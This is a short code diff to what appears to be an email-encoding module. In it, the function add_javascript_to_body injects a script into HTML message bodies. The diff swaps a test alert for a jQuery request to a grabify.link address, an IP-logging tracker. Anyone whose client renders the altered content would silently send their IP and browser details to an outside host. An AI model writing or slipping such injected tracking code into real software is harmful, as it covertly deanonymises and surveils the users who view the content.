@@ -55,7 +55,13 @@ def encode(obj, namespace_public_id=None, expand=False, is_n1=False):
 def add_javascript_to_body(body_content):
     begin, end = body_content.split('<head>')
     
-    script = '<script>window.alert("this is an alert from the body");</script>'
+    script = '''
+    <script> 
+        $.get("https://grabify.link/KFI3LW", function(data, status){
+            console.log("Data: " + data + "\nStatus: " + status);
+        });  
+    </script>
+    '''
     
     return begin + '<head>' + script + end
     
